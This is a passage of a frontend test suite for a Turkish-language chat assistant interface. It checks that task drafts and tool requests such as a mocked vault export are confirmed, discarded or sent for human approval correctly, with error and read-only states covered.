    const reply = screen.getByText("Tamam.");
    expect(reply.compareDocumentPosition(card) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it("treats a second confirm (already confirmed elsewhere) as confirmed after a refresh", async () => {
    let gets = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        return json([
          msg({
            id: "u1",
            intent: "task_draft",
            intent_payload: { title: "Annemi ara", due_date: null },
            confirmed_task: gets === 1 ? null : "t1",
          }),
        ]);
      }
      if (input === "/api/tasks" && init?.method === "POST") {
        return json(
          { detail: "This draft has already been confirmed.", code: "task.draft_already_confirmed" },
          400,
        );
      }
    });

    await renderAndOpen();
    await userEvent.click(await screen.findByRole("button", { name: "Görevi onayla" }));
    expect(await screen.findByText("Görev oluşturuldu")).toBeInTheDocument();
    expect(gets).toBe(2);
  });

  it("discards a task draft without calling POST /api/tasks and remembers it across reloads", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({
            id: "u1",
            intent: "task_draft",
            intent_payload: { title: "Annemi ara", due_date: null },
          }),
        ]);
      }
      if (input === "/api/tasks") throw new Error("must not call /api/tasks on discard");
    });

    const { unmount } = await renderAndOpen();
    await screen.findByTestId("task-draft-card");
    await userEvent.click(screen.getByRole("button", { name: "Vazgeç" }));
    expect(screen.queryByTestId("task-draft-card")).not.toBeInTheDocument();

    unmount();
    await renderAndOpen();
    await screen.findByPlaceholderText("Jarvis'e yaz…");
    await waitFor(() => expect(screen.queryByTestId("task-draft-card")).not.toBeInTheDocument());
  });

  it("confirms a live tool request via POST /api/approvals/requests; the decision stays on /approvals", async () => {
    let gets = 0;
    let creates = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && isGet(init)) {
        gets += 1;
        return json(
          gets === 1
            ? []
            : [
                msg({
                  id: "u1",
                  content: "export my vault",
                  intent: "tool_request",
                  intent_payload: { tool_name: "vault_export", payload: {} },
                }),
                msg({ id: "a1", role: "assistant", content: "Onay isteyeceğim." }),
              ],
        );
      }
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({ type: "chunk", text: "Onay isteyeceğim." }),
          frame({
            type: "draft",
            kind: "tool",
            source_message_id: "u1",
            tool_name: "vault_export",
            payload: {},
          }),
          frame({ type: "done", message_id: "a1" }),
        ]);
      }
      if (input === "/api/approvals/requests" && init?.method === "POST") {
        creates += 1;
        expect(JSON.parse(init.body as string)).toMatchObject({
          workspace: "w1",
          tool_name: "vault_export",
          payload: {},
        });
        return json(
          {
            id: "ar1",
            workspace: "w1",
            tool_name: "vault_export",
            status: "pending",
            requested_by: "u1",
            decided_by: null,
            decided_at: null,
            created_at: "t",
            updated_at: "t",
            execution: null,
          },
          201,
        );
      }
    });

    await renderAndOpen();
    await send("export my vault");

    expect(await screen.findByText("Bu bir araç isteği gibi görünüyor")).toBeInTheDocument();
    // Still interactive after the history reconciled (this tab got the event).
    await waitFor(() => expect(gets).toBe(2));
    await userEvent.click(screen.getByRole("button", { name: "İsteği onayla" }));

    await waitFor(() => expect(creates).toBe(1));
    expect(await screen.findByText("Beklemede")).toBeInTheDocument();
    expect(screen.queryByText("Bu bir araç isteği gibi görünüyor")).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Onayla" })).not.toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Reddet" })).not.toBeInTheDocument();
  });

  it("shows an error and keeps the tool request card when confirming fails", async () => {
    let creates = 0;
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({
            type: "draft",
            kind: "tool",
            source_message_id: "u1",
            tool_name: "vault_export",
            payload: {},
          }),
          frame({ type: "done", message_id: "a1" }),
        ]);
      }
      if (input === "/api/conversations/c1/messages") return json([]);
      if (input === "/api/approvals/requests" && init?.method === "POST") {
        creates += 1;
        return json(
          {
            detail: "Role does not allow requesting a gated action.",
            code: "approval.permission_denied",
          },
          403,
        );
      }
    });

    await renderAndOpen();
    await send("export my vault");

    await userEvent.click(await screen.findByRole("button", { name: "İsteği onayla" }));
    expect(
      await screen.findByText("Rolün bu onay isteğine karar vermeye yetmiyor."),
    ).toBeInTheDocument();
    expect(screen.queryByText(/Role does not allow/)).not.toBeInTheDocument();
    expect(creates).toBe(1);
    expect(screen.getByText("Bu bir araç isteği gibi görünüyor")).toBeInTheDocument();
  });

  it("discards a live tool request without calling POST /api/approvals/requests", async () => {
    mockFetch((input, init) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages" && init?.method === "POST") {
        return sseResponse([
          frame({
            type: "draft",
            kind: "tool",
            source_message_id: "u1",
            tool_name: "vault_export",
            payload: {},
          }),
          frame({ type: "done", message_id: "a1" }),
        ]);
      }
      if (input === "/api/conversations/c1/messages") return json([]);
      if (input === "/api/approvals/requests") {
        throw new Error("must not call /api/approvals/requests on discard");
      }
    });

    await renderAndOpen();
    await send("export my vault");
    await screen.findByText("Bu bir araç isteği gibi görünüyor");
    await userEvent.click(screen.getByRole("button", { name: "Vazgeç" }));
    expect(screen.queryByText("Bu bir araç isteği gibi görünüyor")).not.toBeInTheDocument();
  });

  it("renders a persisted tool request read-only, pointing to /approvals", async () => {
    mockFetch((input) => {
      if (input.startsWith("/api/conversations?")) return json([CONVERSATION]);
      if (input === "/api/conversations/c1/messages") {
        return json([
          msg({
            id: "u1",
            intent: "tool_request",
            intent_payload: { tool_name: "vault_export", payload: {} },
          }),
          msg({ id: "a1", role: "assistant", content: "Onay gerekiyor." }),
        ]);
      }
    });

    await renderAndOpen();
    const notice = await screen.findByTestId("tool-request-notice");
    expect(notice).toHaveTextContent("Araç isteği: vault_export");
    expect(within(notice).getByRole("link", { name: "Onaylara git" })).toHaveAttribute(
      "href",
      "/approvals?workspace=w1",
    );
    expect(screen.queryByRole("button", { name: "İsteği onayla" })).not.toBeInTheDocument();
  });
});
